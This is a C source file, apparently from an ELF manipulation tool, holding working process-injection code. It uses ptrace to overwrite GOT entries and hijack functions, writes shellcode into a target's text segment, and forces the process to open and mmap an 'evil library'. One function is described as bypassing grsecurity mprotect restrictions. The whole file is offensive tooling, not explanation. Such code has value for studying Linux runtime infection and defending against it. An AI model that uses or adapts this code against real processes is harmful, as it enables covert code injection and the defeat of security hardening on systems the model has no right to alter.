/* This is old code modified for use with Quenya, it will eventually */
/* Warrant a rewrite. */


#include "elfmod.h"

/* memrw() request to modify global offset table */
#define MODIFY_GOT 1

/* memrw() request to patch parasite */
/* with original function address */
#define INJECT_TRANSFER_CODE 2

struct segments
{
        unsigned long text_off;
        unsigned long text_len;
        unsigned long data_off;
        unsigned long data_len;
} segment;

/* This is a function that the library loading functions below */
/* are dependent upon */
unsigned long memrw(unsigned long *buf, unsigned long vaddr, unsigned int size, int pid, unsigned long new)
{
        int i, j, data;
	int ret;
	int ptr = vaddr;

	/* get the memory address of the function to hijack */
        if (size == MODIFY_GOT && !buf)
  	{
              original = (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
	      ret = ptrace(PTRACE_POKETEXT, pid, vaddr, new);
	      return (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
	}	
	else
	if(size == INJECT_TRANSFER_CODE)
	{ 
		ptrace(PTRACE_POKETEXT, pid, vaddr, new);
	
		j = 0;
		vaddr --;
		for (i = 0; i < 2; i++)
		{
			data = ptrace(PTRACE_PEEKTEXT, pid, (vaddr + j));
			buf[i] = data;
			j += 4;
		}
		return 1;
	}
        for (i = 0, j = 0; i < size; i+= sizeof(uint32_t), j++)
        {
                /* PTRACE_PEEK can return -1 on success, check errno */
                if(((data = ptrace(PTRACE_PEEKTEXT, pid, vaddr + i)) == -1) && errno)
                        return -1;
                buf[j] = data;
        }
        return i;
}

/*
 * This is a function I wrote for mmap'ng code into memory 
 * while bypassing grsec mprotect()'s. It only works if certain
 * ptrace disabling features are not enabled in grsec. There is
 * another function in the works that is slightly better in the
 * sense that it can load code and apply relocations thus PIC
 * is not necessary.
 */

int grsec_mmap_library(int pid, char *target)
{
	struct  user_regs_struct reg;
        long eip, esp, string, offset, str,
        eax, ebx, ecx, edx, orig_eax, data;
	int syscall;
	int i, j = 0, ret, status, fd;
	char library_string[MAXBUF];
	char orig_ds[MAXBUF];
	char buf[MAXBUF] = {0};
	unsigned char tmp[8192], *mem;
	char open_done = 0, mmap_done = 0;
	unsigned long sysenter = 0;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	int libfd;
	struct stat lst;
	long text_offset, text_length, data_offset, data_length;

	if ((libfd = open(EVILLIB_FULLPATH, O_RDONLY)) == -1)
		return -1;

	if (fstat(libfd, &lst) < 0)
		return -1;

	mem = mmap(NULL, lst.st_size, PROT_READ, MAP_PRIVATE, libfd, 0);
	if (mem == MAP_FAILED)
		return -1;

	ehdr = (Elf32_Ehdr *)mem;
	phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);

	for (i = ehdr->e_phnum; i-- > 0; phdr++)
		if (phdr->p_type == PT_LOAD && phdr->p_offset == 0)
		{
			text_offset = phdr->p_offset;
			text_length = phdr->p_filesz;
			phdr++;
			data_offset = phdr->p_offset;
			data_length = phdr->p_filesz;
			break;
		}

	strcpy(library_string, target);
	
	/* backup first part of data segment which will use for a string and some vars */
	memrw ((unsigned long *)orig_ds, data_segment, strlen(library_string)+32, pid, 0);
	
	/* store our string for our evil lib there */
	for (i = 0; i < strlen(library_string); i += 4)
		ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(library_string + i));
	
	/* verify we have the correct string */
	for (i = 0; i < strlen(library_string); i+= 4)
		*(long *)&buf[i] = ptrace(PTRACE_PEEKTEXT, pid, (data_segment + i));
	
	if (strcmp(buf, EVILLIB_FULLPATH) == 0)
		printf("Verified string is stored in DS: %s\n", buf);
	else
	{
		printf("String was not properly stored in DS: %s\n", buf);
		return 0;
	}
	
	ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
	wait(NULL);

	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	eax = reg.eax;
        ebx = reg.ebx;
        ecx = reg.ecx;
        edx = reg.edx;
        eip = reg.eip;
        esp = reg.esp; 
	
	long syscall_eip = reg.eip - 20;
	
	/* this gets sysenter dynamically incase its randomized */
	if (!static_sysenter)
	{
       		memrw((unsigned long *)tmp, syscall_eip, 20, pid, 0);
       	 	for (i = 0; i < 20; i++)
               		 if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
                        	sysenter = syscall_eip + i;
	}
	/* this works only if sysenter isn't at random location */
	else
	{
		memrw((unsigned long *)tmp, 0xffffe000, 8192, pid, 0);
		for (i = 0; i < 8192; i++)
			if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
				sysenter = 0xffffe000 + i;
	}
	sysenter -= 5;

	if (!sysenter)
		return -1;

	/*
	 sysenter should point to: 
              push   %ecx
              push   %edx
              push   %ebp
              mov    %esp,%ebp
              sysenter 
 	*/

	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	wait(0);

        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
        {
  	      perror("ptrace_attach");
              exit(-1);
        }
        waitpid(pid, &status, WUNTRACED);
	
	reg.eax = SYS_open;
	reg.ebx = (long)data_segment;
	reg.ecx = 0;  
	reg.eip = sysenter;
	
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
        
	for(i = 0; i < 5; i++)
	{
		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
		wait(NULL);
		ptrace(PTRACE_GETREGS, pid, NULL, &reg);
		if (reg.eax != SYS_open)
			fd = reg.eax;
	}
	offset = (data_segment + strlen(library_string)) + 8;

	reg.eip = sysenter;
        reg.eax = SYS_mmap;
        reg.ebx = offset;
                
        ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
        ptrace(PTRACE_POKETEXT, pid, offset + 4, text_length + (PAGE_SIZE - (text_length & (PAGE_SIZE - 1))));
        ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ|PROT
        ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
        ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
        ptrace(PTRACE_POKETEXT, pid, offset + 20, text_offset);   

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);	
	
 	for(i = 0; i < 5; i++)
        {
                ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
                wait(NULL);
                ptrace(PTRACE_GETREGS, pid, NULL, &reg);
		if (reg.eax != SYS_mmap)
			evil_base = reg.eax;
        }
	
	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
        ptrace(PTRACE_POKETEXT, pid, offset + 4, data_length + (PAGE_SIZE - (data_length & (PAGE_SIZE - 1))));
        ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ|PROT_WRITE
        ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
        ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
        ptrace(PTRACE_POKETEXT, pid, offset + 20, data_offset);    
	
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
        ptrace(PTRACE_GETREGS, pid, NULL, &reg);

        for(i = 0; i < 5; i++)
        {
                ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
                wait(NULL);
	}
	/* Restoring data segment */
        for (i = 0; i < strlen(library_string) + 32; i++)
       		ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(orig_ds + i));
	
	reg.eip = eip;
	reg.eax = eax;
	reg.ebx = ebx;
	reg.ecx = ecx;
	reg.edx = edx; 
	reg.esp = esp;
	
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}
/* function to load our evil library */
int mmap_library(int pid)
{
        struct  user_regs_struct reg;
        long eip, esp, string, offset, str,
	eax, ebx, ecx, edx;

	int i, j = 0, ret, status;
  	unsigned long buf[30];
     	unsigned char saved_text[94];
	unsigned char *p;

	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

        eip = reg.eip;
        esp = reg.esp;
	eax = reg.eax;
	ebx = reg.ebx;
	ecx = reg.ecx;
	edx = reg.edx;

	offset = text_base;
	
	printf("%%eip -> 0x%x\n", eip);
	printf("Injecting mmap_shellcode at 0x%x\n", offset);
 
	/* were going to load our shellcode at base */
	/* first we must backup the original code into saved_text */
	for (i = 0; i < 90; i += 4)
		buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));
	p = (unsigned char *)buf;
	memcpy(saved_text, p, 90);
	
	printf("Here is the saved code we will be overwriting:\n");
	for (j = 0, i = 0; i < 90; i++)
	{
		if ((j++ % 20) == 0)
			printf("\n");
		printf("\\x%.2x", saved_text[i]);
	}
	printf("\n");
         /* load shellcode into text starting at eip */
        for (i = 0; i < 90; i += 4)
          	 ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(mmap_shellcode + i));
	
	printf("\nVerifying shellcode was injected properly, does this look ok?\n");
	j = 0;
	for (i = 0; i < 90; i += 4)
		buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));

	p = (unsigned char *) buf;
	for (j = 0, i = 0; i < 90; i++)
	{
		if ((j++ % 20) == 0)
			printf("\n");
		printf("\\x%.2x", p[i]);
	}

	printf("\n\nSetting %%eip to 0x%x\n", offset);

	reg.eip = offset + 2;
        ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	
	wait(NULL);
	/* check where eip is now at */	
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	printf("%%eip is now at 0x%x, resetting it to 0x%x\n", reg.eip, eip);
	printf("inserting original code back\n");
	
	for (j = 0, i = 0; i < 90; i += 4)
		buf[j++] = ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(saved_text + i));

	/* get base addr of our mmap'd lib */
	evil_base = reg.eax;
	
	reg.eip = eip;
	reg.eax = eax;
	reg.ebx = ebx;
	reg.ecx = ecx;
	reg.edx = edx;
	reg.esp = esp;

        ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
	{
		perror("ptrace_detach");
		exit(-1);
	}

}

